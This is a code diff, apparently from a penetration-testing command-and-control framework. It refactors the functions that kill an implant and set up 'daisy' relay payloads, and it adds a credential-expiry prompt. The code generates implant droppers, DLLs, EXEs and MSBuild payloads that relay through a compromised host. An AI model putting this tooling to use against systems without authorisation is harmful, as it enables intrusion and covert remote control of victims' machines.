@@ -193,7 +193,7 @@ def do_migrate(user, command, randomuri):
 
 def do_kill_implant(user, command, randomuri):
     impid = get_implantdetails(randomuri)
-    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
+    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
     if ri.lower() == "n":
         print("Implant not terminated")
     if ri == "":
@@ -334,6 +334,7 @@ def do_startdaisy(user, command, randomuri):
     proxy_user = ""
     proxy_pass = ""
     proxy_url = ""
+    cred_expiry = ""
 
     if elevated.lower() == "n":
         cont = input(Colours.RED + "Daisy from an unelevated context can only bind to localhost, continue? y/N " + Colours.END)
@@ -356,6 +357,7 @@ def do_startdaisy(user, command, randomuri):
         proxy_user = input(Colours.GREEN + "Proxy user (<domain>\\<username>, leave blank if none): " + Colours.END)
         proxy_pass = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
         proxy_url = input(Colours.GREEN + "Proxy URL (leave blank if none): " + Colours.END)
+        cred_expiry = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018: ")
 
         if not upstream_url:
             upstream_url = PayloadCommsHost
@@ -384,9 +386,9 @@ def do_startdaisy(user, command, randomuri):
         daisyhost = get_implantdetails(randomuri)
         proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
         C2 = get_c2server_all()
-        newPayload = Payloads(C2[5], C2[2], f"http://{bind_ip}", "", f"{bind_port}", "", "", "",
-                                "", proxynone, C2[17], C2[18], C2[19], "%s?d" % get_newimplanturl(), PayloadsDirectory)
-        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost[11], daisyhost[3]))
+        urlId = new_urldetails(name, f"http://{bind_ip}:{bind_port}", C2.DomainFrontHeader, proxy_url, proxy_user, proxy_pass, cred_expiry)
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand = proxynone, URLID = urlId)
+        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
         newPayload.CreateRaw(name)
         newPayload.CreateDroppers(name)
         newPayload.CreateDlls(name)
@@ -394,5 +396,4 @@ def do_startdaisy(user, command, randomuri):
         newPayload.CreateEXE(name)
         newPayload.CreateMsbuild(name)
         newPayload.CreateCS(name)
-        new_urldetails(name, C2[1], C2[3], f"Daisy: {name}", upstream_url, daisyhost[0], "")
         print_good("Created new %s daisy payloads" % name)
